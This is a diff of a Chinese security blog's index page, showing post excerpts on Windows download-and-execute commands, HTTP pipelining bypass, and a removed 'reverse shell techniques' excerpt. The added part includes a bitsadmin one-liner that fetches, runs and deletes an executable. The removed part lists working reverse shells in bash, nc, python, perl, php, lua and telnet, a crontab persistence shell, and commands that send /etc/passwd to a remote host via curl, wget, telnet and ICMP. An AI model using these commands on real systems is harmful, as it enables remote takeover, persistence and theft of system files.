@@ -173,6 +173,122 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-windows下载执行命令大全" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/01/21/windows下载执行命令大全/" class="article-date">
+  	<time datetime="2019-01-21T10:03:19.000Z" itemprop="datePublished">2019-01-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/21/windows下载执行命令大全/">
+        windows下载执行命令大全
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-bitsadmin命令（只能命令下载到指定路径上，win7以上）："><a href="#1-bitsadmin命令（只能命令下载到指定路径上，win7以上）：" class="headerlink" title="1.bitsadmin命令（只能命令下载到指定路径上，win7以上）："></a>1.bitsadmin命令（只能命令下载到指定路径上，win7以上）：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&quot; &quot;d:\abc.jpg&quot;</span><br><span class="line">bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+        <p class="article-more-link">
+          <a  href="/2019/01/21/windows下载执行命令大全/#more">more >></a>
+        </p>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-HTTP分块传输" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/01/21/HTTP分块传输/" class="article-date">
+  	<time datetime="2019-01-21T04:06:30.000Z" itemprop="datePublished">2019-01-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/21/HTTP分块传输/">
+        HTTP分块传输
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="利用pipline绕过"><a href="#利用pipline绕过" class="headerlink" title="利用pipline绕过"></a>利用pipline绕过</h2><p>修改为正常内容id=1，再将数据包的Content-Length的值设置为修改后的【id=1】的字符长度即4，最后将Connection字段值设为keep-alive。提交后如图七所示，会返回两个响应包，分别对应两个请求</p>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+        <p class="article-more-link">
+          <a  href="/2019/01/21/HTTP分块传输/#more">more >></a>
+        </p>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-反弹shell姿势" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -205,47 +321,6 @@
         <p>不过无论怎么玩，还是直接弹回一个<code>shell</code>来最实用，于是可以有</p>
 <p>basn方式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-<p>exec方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
-<p><strong>nc方式</strong></p>
-<p>本机运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p port</span><br></pre></td></tr></table></figure>
-<p>目标主机</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>
-<p>另一种nc方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc 受害者ip port    #这个比较特殊,需要在你自己的机器上运行</span><br></pre></td></tr></table></figure>
-<p>python方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
-<p>另一种</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
-<p>perl方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
-<p>php方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
-<p>lua方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br><span class="line">#需要lua socket支持，且lua5.2+不支持luasocket</span><br></pre></td></tr></table></figure>
-<p>crontab方式</p>
-<p>crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/目录，ubuntu是/ var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>telnet方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
-<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p>无空格</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 4 8.8.8.8;hostname|&#123;nc,ip,port&#125;</span><br></pre></td></tr></table></figure>
-<p>使用nc将文件重定向</p>
-<p>靶机上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port &lt; /etc/passwd</span><br></pre></td></tr></table></figure>
-<p>本机直接nc ip port得到文件内容</p>
-<p>使用http协议，通过curl：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip:port -F a=@/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>同样可以通过curl使用ftp协议，同理wget、telnet当然也是可以的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget --post-data=&quot;`cat /etc/passwd`&quot; http://ip:port</span><br><span class="line"></span><br><span class="line">wget --post-file=/etc/passwd http://ip:port</span><br><span class="line"></span><br><span class="line">telnet 106.14.153.173 2015 &lt; /etc/passwd</span><br></pre></td></tr></table></figure>
-<p>使用ICMP报文</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done</span><br></pre></td></tr></table></figure>
-
       
     </div>
     
@@ -257,6 +332,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a  href="/2019/01/19/反弹shell姿势/#more">more >></a>
+        </p>
       
     
   </div>
@@ -683,125 +762,9 @@
 
 
   
-    <article id="post-python编程中在ubuntu中安装虚拟环境及环境配置" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/06/python编程中在ubuntu中安装虚拟环境及环境配置/" class="article-date">
-  	<time datetime="2018-10-06T13:04:16.000Z" itemprop="datePublished">2018-10-06</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/06/python编程中在ubuntu中安装虚拟环境及环境配置/">
-        python编程中在ubuntu中安装虚拟环境及环境配置
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="python编程中在ubuntu中安装虚拟环境及环境配置"><a href="#python编程中在ubuntu中安装虚拟环境及环境配置" class="headerlink" title="python编程中在ubuntu中安装虚拟环境及环境配置"></a>python编程中在ubuntu中安装虚拟环境及环境配置</h1><p>1.升级python包管理工具pip</p>
-<p>pip install –upgrade pip</p>
-<p>备注：当你想升级一个包的时候 <code>pip install --upgrade 包名</code><br>2.python虚拟环境安装</p>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-        <p class="article-more-link">
-          <a  href="/2018/10/06/python编程中在ubuntu中安装虚拟环境及环境配置/#more">more >></a>
-        </p>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-sqlmap数据转中文字符串" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/06/sqlmap数据转中文字符串/" class="article-date">
-  	<time datetime="2018-10-06T13:03:00.000Z" itemprop="datePublished">2018-10-06</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/06/sqlmap数据转中文字符串/">
-        sqlmap数据转中文字符串
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>sqlmap数据转中文字符串</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#sqlmap 转中文字符串</span></span><br><span class="line">str = <span class="string">'\xb3\xac\xbc\xb6\xc7\xbf\xb4\xf3\xcc\xab\xcf\xb2\xbb\xb6\xc1\xcb'</span></span><br><span class="line">b = repr(str)</span><br><span class="line"><span class="keyword">print</span> unicode(eval(b),<span class="string">"gbk"</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 </div>
